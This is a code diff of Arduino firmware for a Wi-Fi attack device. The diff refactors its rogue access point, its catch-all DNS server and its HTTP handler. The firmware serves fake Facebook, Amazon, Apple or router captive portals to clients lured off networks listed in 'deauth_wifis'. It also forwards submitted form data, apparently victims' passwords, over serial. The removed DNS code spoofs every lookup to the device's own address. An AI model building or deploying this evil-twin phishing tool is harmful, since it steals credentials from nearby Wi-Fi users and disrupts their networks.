@@ -1,76 +1,32 @@
-
 #include "vector"
 #include "wifi_conf.h"
-#include "map"
 #include "wifi_cust_tx.h"
-#include "wifi_util.h"
-#include "wifi_structures.h"
 #include "wifi_drv.h"
 #include "debug.h"
 #include "WiFi.h"
-#include <Arduino_JSON.h>
-#include <rtl8721d.h>
-#include <sys_api.h>
-#include <stdio.h>
+
+//Captive portals
 #include "facebook.h"
 #include "amazon.h"
 #include "apple.h"
 #include "default.h"
+
 //DNS
-#include <WiFiUdp.h>
-#include <lwip/udp.h>
-#include <lwip/tcp.h>
-#include <lwip/netifapi.h>
+
+#include "dns.h"
 #include <lwip/lwip_v2.0.2/src/include/lwip/priv/tcp_priv.h>
-#include <wifi_Udp.h>
+
 #define MIN(a, b) ((a) < (b) ? (a) : (b))
 
 #define BAUD 115200
 
 //DNS
 
-#define DNS_HEADER_SIZE        12
-#define DNS_SERVER_PORT        53
 
-static struct udp_pcb *dns_server_pcb;
 
-struct dns_hdr {
-  PACK_STRUCT_FIELD(u16_t id);
-  PACK_STRUCT_FIELD(u8_t flags1);
-  PACK_STRUCT_FIELD(u8_t flags2);
-  PACK_STRUCT_FIELD(u16_t numquestions);
-  PACK_STRUCT_FIELD(u16_t numanswers);
-  PACK_STRUCT_FIELD(u16_t numauthrr);
-  PACK_STRUCT_FIELD(u16_t numextrarr);
-} PACK_STRUCT_STRUCT;
 
-struct DNSHeader {
-  uint16_t ID;  // identification number
-  union {
-    struct {
-      uint16_t RD     : 1;  // recursion desired
-      uint16_t TC     : 1;  // truncated message
-      uint16_t AA     : 1;  // authoritative answer
-      uint16_t OPCode : 4;  // message_type
-      uint16_t QR     : 1;  // query/response flag
-      uint16_t RCode  : 4;  // response code
-      uint16_t Z      : 3;  // its z! reserved
-      uint16_t RA     : 1;  // recursion available
-    };
-    uint16_t Flags;
-  };
-  uint16_t QDCount;  // number of question entries
-  uint16_t ANCount;  // number of ANswer entries
-  uint16_t NSCount;  // number of authority entries
-  uint16_t ARCount;  // number of Additional Resource entries
-};
 
-struct DNSQuestion {
-  const uint8_t *QName;
-  uint16_t QNameLength;
-  uint16_t QType;
-  uint16_t QClass;
-};
+
 
 enum portals{
   Default,
@@ -139,121 +95,9 @@ String parseRequest(String request) {
   return request.substring(path_start, path_end);
 }
 
-void printCurrentNet() {
-    // print the SSID of the AP:
-    Serial.print("SSID: ");
-    Serial.println(WiFi.SSID());
-
-    // print the MAC address of AP:
-    byte bssid[6];
-    WiFi.BSSID(bssid);
-    Serial.print("BSSID: ");
-    Serial.print(bssid[0], HEX);
-    Serial.print(":");
-    Serial.print(bssid[1], HEX);
-    Serial.print(":");
-    Serial.print(bssid[2], HEX);
-    Serial.print(":");
-    Serial.print(bssid[3], HEX);
-    Serial.print(":");
-    Serial.print(bssid[4], HEX);
-    Serial.print(":");
-    Serial.println(bssid[5], HEX);
-
-    // print the encryption type:
-    byte encryption = WiFi.encryptionType();
-    Serial.print("Encryption Type:");
-    Serial.println(encryption, HEX);
-    Serial.println();
-}
-
-
 //DNS
 bool apActive = false;
-uint8_t dhcpServer[4]={192,168,1,1};
-bool requestIncludesOnlyOneQuestion(DNSHeader &dnsHeader) {
-  return ntohs(dnsHeader.QDCount) == 1 && dnsHeader.ANCount == 0 && dnsHeader.NSCount == 0 && dnsHeader.ARCount == 0;
-}
-static void dnss_receive_udp_packet_handler(
-  
-        void *arg,
-        struct udp_pcb *udp_pcb,
-        struct pbuf *udp_packet_buffer,
-        struct ip_addr *sender_addr,
-        uint16_t sender_port) 
-{     
-        /* To avoid gcc warnings */
-        ( void ) arg;
- String _domainName;
-        DNSHeader dnsHeader;
-        DNSQuestion dnsQuestion;
-        int sizeUrl;
-        memcpy(&dnsHeader, udp_packet_buffer->payload, DNS_HEADER_SIZE);
-          if (requestIncludesOnlyOneQuestion(dnsHeader)) {
-            /*
-              // The QName has a variable length, maximum 255 bytes and is comprised of multiple labels.
-              // Each label contains a byte to describe its length and the label itself. The list of
-              // labels terminates with a zero-valued byte. In "github.com", we have two labels "github" & "com"
-        */
-            const char *enoflbls = strchr(reinterpret_cast<const char *>(udp_packet_buffer->payload) + DNS_HEADER_SIZE, 0);  // find end_of_label marker
-            ++enoflbls;                                                                                      // advance after null terminator
-            dnsQuestion.QName = (uint8_t *)udp_packet_buffer->payload + DNS_HEADER_SIZE;                                                // we can reference labels from the request
-            dnsQuestion.QNameLength = enoflbls - (char *)udp_packet_buffer->payload - DNS_HEADER_SIZE;
-            sizeUrl = static_cast<int>(dnsQuestion.QNameLength);
-            
-            /*
-                check if we aint going out of pkt bounds
-                proper dns req should have label terminator at least 4 bytes before end of packet
-              */
-            if (dnsQuestion.QNameLength > udp_packet_buffer->len - DNS_HEADER_SIZE - sizeof(dnsQuestion.QType) - sizeof(dnsQuestion.QClass)) {
-              return;  // malformed packet
-            }         
-                
-                struct dns_hdr *hdr = (struct dns_hdr*) udp_packet_buffer->payload;
-                
-                struct pbuf *p = pbuf_alloc(PBUF_TRANSPORT, sizeof(struct dns_hdr) + sizeUrl + 20, PBUF_RAM);
 
-                if(p) {
-                        struct dns_hdr *rsp_hdr = (struct dns_hdr*) p->payload;
-                        rsp_hdr->id = hdr->id;
-                        rsp_hdr->flags1 = 0x85;
-                        rsp_hdr->flags2 = 0x80;
-                        rsp_hdr->numquestions = PP_HTONS(1);
-                        rsp_hdr->numanswers = PP_HTONS(1);
-                        rsp_hdr->numauthrr = PP_HTONS(0);
-                        rsp_hdr->numextrarr = PP_HTONS(0);
-                        memcpy((uint8_t *) rsp_hdr + sizeof(struct dns_hdr), dnsQuestion.QName, sizeUrl);
-                        *(uint16_t *)((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl) = PP_HTONS(1);
-                        *(uint16_t *)((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl + 2) = PP_HTONS(1);
-                        *((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl + 4) = 0xc0;
-                        *((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl + 5) = 0x0c;
-                        *(uint16_t *)((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl + 6) = PP_HTONS(1);
-                        *(uint16_t *)((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl + 8) = PP_HTONS(1);
-                        *(uint32_t *)((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl + 10) = PP_HTONL(0);
-                        *(uint16_t *)((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl + 14) = PP_HTONS(4);
-                        memcpy((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl + 16, (void*)dhcpServer, 4);
-
-                        udp_sendto(udp_pcb, p, sender_addr, sender_port);
-                        pbuf_free(p);
-                }
-          }
-        //}       
-        else {
-                struct dns_hdr *dns_rsp;
-                dns_rsp = (struct dns_hdr*) udp_packet_buffer->payload;
-
-                dns_rsp->flags1 |= 0x80; // 0x80 : Response;
-                dns_rsp->flags2 = 0x05;  //0x05 : Reply code (Query Refused)
-
-                udp_sendto(udp_pcb, udp_packet_buffer, sender_addr, sender_port);
-        }
-
-        /* free the UDP connection, so we can accept new clients */
-        udp_disconnect(udp_pcb);
-
-        /* Free the packet buffer */
-        pbuf_free(udp_packet_buffer);
-}
 
 int status = WL_IDLE_STATUS;   
 
@@ -279,40 +123,7 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
 }
 WiFiServer server(80);
 bool serveBegined =false;
-void createAP(char* ssid, char* channel){
 
-  DEBUG_SER_PRINT("CREATING AP");
-  DEBUG_SER_PRINT(ssid);
-  DEBUG_SER_PRINT(channel);
-  while (status != WL_CONNECTED) {
-    DEBUG_SER_PRINT("CREATING AP 2");
-      status = WiFi.apbegin(ssid, channel, (uint8_t) 0);
-      delay(1000);
-  }
-  //Buscamos el puerto udp de las dns para matarloo
-  struct udp_pcb *pcb;
-  for (pcb = udp_pcbs; pcb != NULL; pcb = pcb->next) {
-    
-    if(pcb->local_port==DNS_SERVER_PORT){
-      DEBUG_SER_PRINT("unbindg\n");
-      udp_remove(pcb);
-    }
-  }
-  delay(1000);
-
-  //Creamos un nuevo servicio de dns
-  dns_server_pcb = udp_new();
-  DEBUG_SER_PRINT("binding dns\n");
-  udp_bind(dns_server_pcb, IP4_ADDR_ANY, DNS_SERVER_PORT);
-  udp_recv(dns_server_pcb, (udp_recv_fn)dnss_receive_udp_packet_handler, NULL);
-  DEBUG_SER_PRINT("binded dns\n");
-  if(!serveBegined){
-    
-    server.begin();
-    serveBegined=true;
-  }
-  apActive = true;
-}
 
 void createAP(char* ssid, char* channel, char* password){
 
@@ -321,26 +132,18 @@ void createAP(char* ssid, char* channel, char* password){
   DEBUG_SER_PRINT(channel);
   while (status != WL_CONNECTED) {
     DEBUG_SER_PRINT("CREATING AP 2");
-      status = WiFi.apbegin(ssid, password, channel, (uint8_t) 0);
+      if(strcmp(password,"")==0){
+        status = WiFi.apbegin(ssid, channel, (uint8_t) 0);
+      }else{
+        status = WiFi.apbegin(ssid, password, channel, (uint8_t) 0);
+      }
       delay(1000);
   }
-  //Buscamos el puerto udp de las dns para matarloo
-  struct udp_pcb *pcb;
-  for (pcb = udp_pcbs; pcb != NULL; pcb = pcb->next) {
-    
-    if(pcb->local_port==DNS_SERVER_PORT){
-      DEBUG_SER_PRINT("unbindg\n");
-      udp_remove(pcb);
-    }
-  }
+  unbind_dns();
   delay(1000);
 
   //Creamos un nuevo servicio de dns
-  dns_server_pcb = udp_new();
-  DEBUG_SER_PRINT("binding dns\n");
-  udp_bind(dns_server_pcb, IP4_ADDR_ANY, DNS_SERVER_PORT);
-  udp_recv(dns_server_pcb, (udp_recv_fn)dnss_receive_udp_packet_handler, NULL);
-  DEBUG_SER_PRINT("binded dns\n");
+  start_DNS_Server();
   if(!serveBegined){
     
     server.begin();
@@ -348,16 +151,14 @@ void createAP(char* ssid, char* channel, char* password){
   }
   apActive = true;
 }
+void createAP(char* ssid, char* channel){
 
+  createAP(ssid, channel, "");
+}
 void destroyAP(){
   //udp_remove(dns_server_pcb);
   
-  struct udp_pcb *pcb;
-  for (pcb = udp_pcbs; pcb != NULL; pcb = pcb->next) {
-    //if(pcb->local_port==DNS_SERVER_PORT){
-      udp_remove(pcb);
-    //}
-  }
+  void unbind_all_udp();
   delay(500);
   WiFiClient client = server.available();
   while(client.connected()){
@@ -469,6 +270,8 @@ void setup() {
 }
 String ssid="";
 uint32_t current_num = 0;
+
+bool clientServing = false;
 void loop() {
   while (Serial1.available()) {
     delay(3);  //delay to allow buffer to fill 
@@ -741,56 +544,52 @@ void loop() {
 
   }
   
-  if(apActive){
-    WiFiClient client = server.available();
-    
-    
-  
+if (apActive) {
+  WiFiClient client = server.available();
+
+  if (client) {
     String request;
-    if (client) {
-        // an http request ends with a blank line
+    request.reserve(256);  // Reservamos memoria para evitar fragmentación
 
+    unsigned long startTime = millis();
+    while (client.connected() && (millis() - startTime < 300)) {
+      if (client.available()) {
+        char character = client.read();
+        request += character;
 
-        while (client.connected()) {          
-              if (client.available()) {
-                while (client.available()){
-                char character = (char)client.read();
-                request += character;
-                 if(character == '\n'){
-                  while (client.available())client.read();
-                  break;
-                 }
-                 delay(1);
-                }
-                struct tcp_pcb *tcp;
-                for(tcp = tcp_tw_pcbs; tcp != NULL; tcp = tcp->next){
-                  if(tcp->local_port==80)tcp->local_port=localPortNew++;
-                  tcp_close(tcp);
-                }
-
-              String path = parseRequest(request);
-
-              //if (path == "/") {
-	      
-                if(deauth_wifis.size()!=0)
-                  handleRequest(client,(enum portals)portal,scan_results[deauth_wifis[0]].ssid);              
-                else
-                  handleRequest(client,(enum portals)portal,"router");
-              if(path.indexOf('?')&&(path.indexOf('=')>path.indexOf('?'))){
-                  String datos = path.substring(path.indexOf('?')+1);
-                  if(datos.length()>0){
-                    Serial1.print("EV:");
-                    Serial1.println(datos);
-                  }
-              }
-              delay(100);
-              break;
-                
-            }
-
+        if (character == '\n') {
+          while (client.available()) client.read(); // limpia buffer
+          break;
         }
-        client.stop(); // remove this line since destructor will be called automatically
+      } else {
+        delay(1);
+      }
     }
+
+    // Opcional: forzar limpieza de conexiones TIME-WAIT (solo si es necesario)
+    struct tcp_pcb *tcp;
+    for (tcp = tcp_tw_pcbs; tcp != NULL; tcp = tcp->next) {
+      if (tcp->local_port == 80) tcp->local_port = localPortNew++;
+      tcp_close(tcp);
+    }
+
+    String path = parseRequest(request);
+    if (deauth_wifis.size() != 0)
+      handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
+    else
+      handleRequest(client, (enum portals)portal, "router");
+
+    if (path.indexOf('?') && (path.indexOf('=') > path.indexOf('?'))) {
+      String datos = path.substring(path.indexOf('?') + 1);
+      if (datos.length() > 0) {
+        Serial1.print("EV:");
+        Serial1.println(datos);
+      }
+    }
+
+    delay(50);  // menor delay, no saturar
+    client.stop();
   }
+}
   
 }
